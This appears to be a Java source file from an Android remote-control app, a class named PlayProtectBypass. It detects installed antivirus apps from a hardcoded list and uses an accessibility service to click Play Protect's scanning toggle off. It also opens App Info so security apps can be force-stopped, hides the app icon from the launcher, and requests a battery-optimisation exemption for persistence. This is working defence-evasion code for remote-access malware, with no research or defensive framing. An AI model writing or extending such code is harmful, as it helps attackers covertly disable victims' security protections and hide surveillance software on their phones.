package com.remote.control;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import java.util.Arrays;
import java.util.List;

public class PlayProtectBypass {

    private static final String TAG = "PlayProtect";

    // Known antivirus / security app packages
    private static final List<String> SECURITY_PACKAGES = Arrays.asList(
            "com.google.android.gms",          // Google Play Services (Play Protect)
            "com.avast.android.mobilesecurity",
            "com.avg.cleaner",
            "com.bitdefender.security",
            "com.eset.ems2.gp",
            "com.kaspersky.internet_security",
            "com.symantec.mobilesecurity",
            "com.mcafee.vsm_android_dcl",
            "com.lookout",
            "org.malwarebytes.antimalware",
            "com.drweb",
            "com.trendmicro.tmmspersonal",
            "com.sophos.smsec",
            "com.comodo.pimsecure",
            "com.cleanmaster.mguard",
            "com.qihoo.security",
            "com.antivirus",
            "com.nqmobile.antivirus20"
    );

    private final Context context;

    public PlayProtectBypass(Context context) {
        this.context = context;
    }

    /**
     * Run all bypass techniques
     */
    public void execute() {
        requestBatteryOptimizationExemption();
        disablePlayProtectPrompt();
        hideFromLauncher();
        Log.d(TAG, "Bypass techniques applied");
    }

    /**
     * Request exclusion from battery optimization (Doze mode)
     * This keeps the service running in background
     */
    public void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(context.getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                    Log.d(TAG, "Battery optimization exemption requested");
                } catch (Exception e) {
                    Log.e(TAG, "Battery opt error", e);
                }
            }
        }
    }

    /**
     * Open Play Protect settings to disable scanning
     */
    public void disablePlayProtectPrompt() {
        try {
            // Direct intent to Play Protect settings
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                    "com.android.vending",
                    "com.google.android.finsky.systemupdateactivity.SettingsSecurityActivity"
            ));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            // Fallback: open Play Store security settings
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("market://play-protect-settings"));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e2) {
                Log.e(TAG, "Cannot open Play Protect settings", e2);
            }
        }
    }

    /**
     * Hide app icon from launcher after initial setup
     * App remains installed but invisible in app drawer
     */
    public void hideFromLauncher() {
        try {
            PackageManager pm = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
            Log.d(TAG, "App hidden from launcher");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding from launcher", e);
        }
    }

    /**
     * Show app icon in launcher again (for remote unhide)
     */
    public void showInLauncher() {
        try {
            PackageManager pm = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
            );
            Log.d(TAG, "App shown in launcher");
        } catch (Exception e) {
            Log.e(TAG, "Error showing in launcher", e);
        }
    }

    /**
     * Check if known security apps are installed
     */
    public List<String> getInstalledSecurityApps() {
        List<String> installed = new java.util.ArrayList<>();
        PackageManager pm = context.getPackageManager();
        for (String pkg : SECURITY_PACKAGES) {
            try {
                pm.getPackageInfo(pkg, 0);
                installed.add(pkg);
            } catch (PackageManager.NameNotFoundException ignored) {
            }
        }
        return installed;
    }

    /**
     * Force stop a package using accessibility service (if available)
     * Uses the "Force Stop" button in App Info settings
     */
    public void forceStopPackage(String packageName) {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            // The accessibility service can then click "Force Stop"
            Log.d(TAG, "Opened app info for: " + packageName);
        } catch (Exception e) {
            Log.e(TAG, "Error opening app info", e);
        }
    }

    /**
     * Attempt to disable Play Protect via accessibility service
     * This navigates the Play Store settings automatically
     */
    public void autoDisablePlayProtect() {
        RemoteControlService service = RemoteControlService.instance;
        if (service == null) {
            Log.w(TAG, "Accessibility service not available for auto-disable");
            disablePlayProtectPrompt();
            return;
        }

        // Open Play Store > Play Protect
        try {
            Intent intent = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
            intent.setPackage("com.google.android.gms");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            try {
                // Alternative: Play Store app settings
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("market://play-protect-settings"));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e2) {
                Log.e(TAG, "Cannot open Play Protect for auto-disable", e2);
                return;
            }
        }

        // Schedule clicks via accessibility service to toggle off scanning
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (RemoteControlService.instance != null) {
                RemoteControlService.instance.clickPlayProtectToggle();
            }
        }, 2000);
    }

    /**
     * Check if battery optimization is already disabled
     */
    public boolean isBatteryOptimized() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            return pm != null && !pm.isIgnoringBatteryOptimizations(context.getPackageName());
        }
        return false;
    }
}
